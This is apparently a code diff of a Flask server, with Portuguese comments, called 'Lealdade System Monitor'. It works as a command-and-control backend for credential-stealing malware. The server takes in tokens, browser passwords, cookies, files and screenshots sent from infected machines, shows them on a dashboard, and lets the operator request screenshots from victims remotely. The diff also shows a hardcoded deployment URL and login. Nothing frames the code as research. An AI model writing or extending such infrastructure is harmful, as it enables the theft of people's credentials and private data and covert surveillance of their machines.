+                        <p><strong>Updated:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
+                    \`;
+                    tokensContainer.appendChild(div);
+                });
+
+                // Carrega senhas
+                const passwordsResponse = await fetch('/api/passwords_data');
+                const passwords = await passwordsResponse.json();
+                
+                const passwordsContainer = document.getElementById('passwordsList');
+                passwordsContainer.innerHTML = '';
+                
+                Object.entries(passwords).forEach(([endpoint_id, data]) => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = \`
+                        <h3>\${endpoint_id}</h3>
+                        <p><strong>Passwords:</strong> \${data.passwords.length}</p>
+                        <p><strong>Updated:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
+                    \`;
+                    passwordsContainer.appendChild(div);
+                });
+
+                // Carrega cookies
+                const cookiesResponse = await fetch('/api/cookies_data');
+                const cookies = await cookiesResponse.json();
+                
+                const cookiesContainer = document.getElementById('cookiesList');
+                cookiesContainer.innerHTML = '';
+                
+                Object.entries(cookies).forEach(([endpoint_id, data]) => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = \`
+                        <h3>\${endpoint_id}</h3>
+                        <p><strong>Cookies:</strong> \${data.cookies.length}</p>
+                        <p><strong>Updated:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
+                    \`;
+                    cookiesContainer.appendChild(div);
+                });
+            } catch (error) {
+                console.error('Error loading data:', error);
+            }
+        }
+
+        async function loadScreenshots() {
+            try {
+                const response = await fetch('/api/screenshots');
+                const screenshots = await response.json();
+                
+                const container = document.getElementById('screenshotsList');
+                container.innerHTML = '';
+                
+                Object.entries(screenshots).forEach(([endpoint_id, screenshot]) => {
+                    const div = document.createElement('div');
+                    div.className = 'card';
+                    div.innerHTML = \`
+                        <h3>\${endpoint_id}</h3>
+                        <p><strong>Date:</strong> \${new Date(screenshot.timestamp).toLocaleString()}</p>
+                        \${screenshot.image ? \`<img src="data:image/png;base64,\${screenshot.image}" class="screenshot" alt="Screenshot">\` : ''}
+                    \`;
+                    container.appendChild(div);
+                });
+            } catch (error) {
+                console.error('Error loading screenshots:', error);
+            }
+        }
+
+        async function requestScreenshot(endpointId) {
+            try {
+                const response = await fetch(\`/api/request_screenshot/\${endpointId}\`, { method: 'POST' });
+                const result = await response.json();
+                
+                if (result.status === 'success') {
+                    alert(\`Screenshot solicitado para \${endpointId}!\`);
+                } else {
+                    alert(\`Erro: \${result.message}\`);
+                }
+            } catch (error) {
+                alert('Erro ao solicitar screenshot');
+            }
+        }
+
+        function loadAllData() {
+            loadEndpoints();
+            loadFullReports();
+            loadData();
+            loadScreenshots();
+        }
+
+        loadAllData();
+        setInterval(loadAllData, 30000);
     </script>
 </body>
 </html>
 """
 
-# Armazenamento em arquivo para persistência
-DATA_FILE = r"C:\temp\lealdade_monitor_data.json"
-
-def load_data():
-    """Carrega dados do arquivo"""
-    try:
-        if os.path.exists(DATA_FILE):
-            with open(DATA_FILE, 'r') as f:
-                return json.load(f)
-    except:
-        pass
-    
-    return {
-        'endpoints_data': {},
-        'endpoint_tokens': {},
-        'endpoint_screenshots': {},
-        'endpoint_full_reports': {}
-    }
-
-def save_data():
-    """Salva dados no arquivo"""
-    try:
-        os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
-        with open(DATA_FILE, 'w') as f:
-            json.dump({
-                'endpoints_data': endpoints_data,
-                'endpoint_tokens': endpoint_tokens,
-                'endpoint_screenshots': endpoint_screenshots,
-                'endpoint_full_reports': endpoint_full_reports
-            }, f, indent=2)
-    except Exception as e:
-        print(f"[DATA] Erro ao salvar dados: {e}")
-
-def require_auth(f):
-    """Decorador para exigir autenticação"""
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        if not auth_system.is_logged_in():
-            return redirect(url_for('login'))
-        return f(*args, **kwargs)
-    return decorated_function
-
-@app.route('/')
-def index():
-    """Página principal - redireciona para login ou dashboard"""
-    if auth_system.is_logged_in():
-        return redirect(url_for('dashboard'))
-    return render_template_string(LOGIN_TEMPLATE, error=None)
-
-@app.route('/login', methods=['GET', 'POST'])
-def login():
-    """Página de login"""
-    if request.method == 'GET':
-        return render_template_string(LOGIN_TEMPLATE)
-    
-    username = request.form.get('username')
-    password = request.form.get('password')
-    
-    if username and password:
-        success, message = auth_system.login(username, password)
-        
-        if success:
-            session['user'] = auth_system.get_session_info()
-            return redirect(url_for('dashboard'))
-        else:
-            return render_template_string(LOGIN_TEMPLATE, error=message)
-    
-    return render_template_string(LOGIN_TEMPLATE, error="Credenciais inválidas")
-
-@app.route('/logout')
-def logout():
-    """Logout do sistema"""
-    auth_system.logout()
-    session.clear()
-    return redirect(url_for('login'))
-
-@app.route('/dashboard')
-@require_auth
-def dashboard():
-    """Dashboard principal"""
-    session_info = session.get('user', {})
-    
-    # Calcula estatísticas
-    total_endpoints = len(endpoints_data)
-    total_tokens = sum(len(endpoint_tokens.get(ep, [])) for ep in endpoint_tokens)
-    total_passwords = sum(len(endpoint_full_reports.get(ep, {}).get('browser_data', {}).get('Chrome', {}).get('data', [])) for ep in endpoint_full_reports)
-    total_screenshots = len(endpoint_screenshots)
-    
-    # Prepara lista de endpoints com estatísticas
-    endpoints = []
-    for ep_id in endpoints_data.keys():
-        ep_data = endpoints_data[ep_id]
-        endpoints.append({
-            'id': ep_id,
-            'tokens': endpoint_tokens.get(ep_id, []),
-            'passwords': endpoint_full_reports.get(ep_id, {}).get('browser_data', {}).get('Chrome', {}).get('data', [])),
-            'cookies': endpoint_full_reports.get(ep_id, {}).get('browser_data', {}).get('Chrome', {}).get('cookies', [])),
-            'screenshot': ep_id in endpoint_screenshots
-        })
-    
-    return render_template_string(DASHBOARD_TEMPLATE, 
-                             session=session_info,
-                             total_endpoints=total_endpoints,
-                             total_tokens=total_tokens,
-                             total_passwords=total_passwords,
-                             total_screenshots=total_screenshots,
-                             endpoints=endpoints)
-
-# API Endpoints
-@app.route('/api/register', methods=['POST'])
-def register_endpoint():
-    """Registra novo endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id')
-        
-        if endpoint_id:
-            endpoints_data[endpoint_id] = {
-                'id': endpoint_id,
-                'status': 'online',
-                'last_seen': datetime.now().isoformat(),
-                'system_info': data.get('system_info', {}),
-                'registered_at': datetime.now().isoformat()
-            }
-            save_data()
-            print(f"[API] Endpoint registrado: {endpoint_id}")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao registrar endpoint: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/tokens', methods=['POST'])
-def receive_tokens():
-    """Recebe tokens de um endpoint"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id')
-        tokens = data.get('tokens', [])
-        
-        if endpoint_id:
-            endpoint_tokens[endpoint_id] = tokens
-            save_data()
-            print(f"[API] Tokens recebidos: {endpoint_id} - {len(tokens)} tokens")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber tokens: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/full_report', methods=['POST'])
-def receive_full_report():
-    """Recebe relatório completo"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id')
-        dump_data = data.get('dump_data')
-        
-        if endpoint_id:
-            endpoint_full_reports[endpoint_id] = dump_data
-            save_data()
-            print(f"[API] Relatório completo recebido: {endpoint_id}")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber relatório: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/screenshot', methods=['POST'])
-def receive_screenshot():
-    """Recebe screenshot"""
-    try:
-        data = request.json
-        endpoint_id = data.get('endpoint_id')
-        screenshot_data = data.get('screenshot')
-        
-        if endpoint_id and screenshot_data:
-            endpoint_screenshots[endpoint_id] = screenshot_data
-            save_data()
-            print(f"[API] Screenshot recebido: {endpoint_id}")
-            return jsonify({'status': 'success'})
-    except Exception as e:
-        print(f"[API] Erro ao receber screenshot: {e}")
-        return jsonify({'status': 'error', 'message': str(e)}), 500
-
-@app.route('/api/endpoints')
-def list_endpoints():
-    """Lista todos os endpoints"""
-    try:
-        endpoints = []
-        for ep_id, data in endpoints_data.items():
-            endpoints.append({
-                'id': ep_id,
-                'status': data.get('status', 'unknown'),
-                'last_seen': data.get('last_seen', ''),
-                'system_info': data.get('system_info', {}),
-                'tokens_count': len(endpoint_tokens.get(ep_id, [])),
-                'registered_at': data.get('registered_at', '')
-            })
-        
-        return jsonify(endpoints)
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/endpoint_data/<endpoint_id>')
-def get_endpoint_data(endpoint_id):
-    """Retorna dados completos de um endpoint"""
-    try:
-        data = {
-            'tokens': endpoint_tokens.get(endpoint_id, []),
-            'full_report': endpoint_full_reports.get(endpoint_id, {}),
-            'screenshot': endpoint_screenshots.get(endpoint_id, None)
-        }
-        return jsonify(data)
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
-# Carrega dados ao iniciar
-data = load_data()
-endpoints_data = data['endpoints_data']
-endpoint_tokens = data['endpoint_tokens']
-endpoint_screenshots = data['endpoint_screenshots']
-endpoint_full_reports = data['endpoint_full_reports']
-
 if __name__ == '__main__':
-    print("=" * 60)
-    print("LEALDADE SYSTEM MONITOR - RAILWAY VERSION")
-    print("=" * 60)
-    print("🚀 Iniciando servidor de monitoramento...")
-    print("🌐 Acesse: https://web-production-49d37.up.railway.app")
-    print("👤 Login: lealdade / lealdade")
-    print("=" * 60)
+    print("🚀 Iniciando System Monitor COMPLETO...")
+    print("📡 Endpoints disponíveis:")
+    print("   - POST /api/register")
+    print("   - POST /api/metrics")
+    print("   - POST /api/tokens")
+    print("   - POST /api/cookies")
+    print("   - POST /api/passwords")
+    print("   - POST /api/files")
+    print("   - POST /api/full_report")
+    print("   - POST /api/screenshot_upload")
+    print("   - POST /api/complete_report_upload")
+    print("   - GET  /api/endpoints")
+    print("   - GET  /api/full_reports")
+    print("   - GET  /api/tokens_data")
+    print("   - GET  /api/cookies_data")
+    print("   - GET  /api/passwords_data")
+    print("   - GET  /api/screenshots")
+    print()
     
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
